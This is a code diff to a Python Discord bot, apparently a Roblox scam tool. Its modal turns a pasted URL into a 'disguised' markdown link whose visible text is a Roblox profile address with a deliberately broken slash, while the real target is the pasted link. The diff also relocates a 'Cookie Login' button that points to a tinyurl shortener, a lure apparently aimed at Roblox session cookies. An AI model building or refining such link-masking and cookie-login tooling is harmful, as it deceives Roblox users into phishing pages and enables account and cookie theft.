@@ -66,7 +66,8 @@ class KrazyLinkButton(discord.ui.View):
         custom_id="krazy_link_button"
     )
     async def generate(self, interaction, button):
-        await interaction.response.send_modal(KrazyLinkModal()) 
+        await interaction.response.send_modal(KrazyLinkModal())
+
 
 class KrazyLinkModal(discord.ui.Modal, title="Paste Your Roblox Link"):
     roblox_link = discord.ui.TextInput(
@@ -78,30 +79,22 @@ class KrazyLinkModal(discord.ui.Modal, title="Paste Your Roblox Link"):
     async def on_submit(self, interaction: discord.Interaction):
         original_url = self.roblox_link.value
 
-        # Extract user ID
         match = re.search(r"/users/(\d+)/profile", original_url)
         user_id = match.group(1) if match else "unknown"
 
-        # Visible (broken slash)
         visible_link = f"https:/www.roblox.com/users/{user_id}/profile"
-
-        # Disguised link (ONLY this goes inside the file)
         disguised = f"[{visible_link}]({original_url})"
 
         from discord import File
         import io
 
-        # File ONLY contains the link
         file = File(io.BytesIO(disguised.encode()), filename="krazy_link.txt")
 
         try:
-            # DM message ABOVE the file
             await interaction.user.send(
                 "**KRAZY LINK GENERATED**\n"
                 "Copy URL below:"
             )
-
-            # Send the file separately
             await interaction.user.send(file=file)
 
             await interaction.response.send_message(
@@ -114,6 +107,19 @@ class KrazyLinkModal(discord.ui.Modal, title="Paste Your Roblox Link"):
                 "I couldn't DM you. Please enable DMs.",
                 ephemeral=True
             )
+
+
+# ---------------- COOKIE LOGIN BUTTON (MUST BE ABOVE on_ready) ----------------
+
+class CookieLoginButton(discord.ui.View):
+    def __init__(self):
+        super().__init__(timeout=None)
+        self.add_item(discord.ui.Button(
+            label="Cookie Login",
+            url="https://tinyurl.com/cookie-login",
+            style=discord.ButtonStyle.link,
+            custom_id="cookie_login_button"
+        ))
 
 
 # ---------------- AUTO-POST SYSTEMS ----------------
@@ -215,17 +221,6 @@ async def on_ready():
 
     except Exception as e:
         print("Failed to post CookieLogin button:", e)
-
-class CookieLoginButton(discord.ui.View):
-    def __init__(self):
-        super().__init__(timeout=None)
-
-        self.add_item(discord.ui.Button(
-            label="Cookie Login",
-            url="https://tinyurl.com/cookie-login",
-            style=discord.ButtonStyle.link,
-            custom_id="cookie_login_button"
-        ))
 
 # ---------------- SMART DM SYSTEM ----------------
 
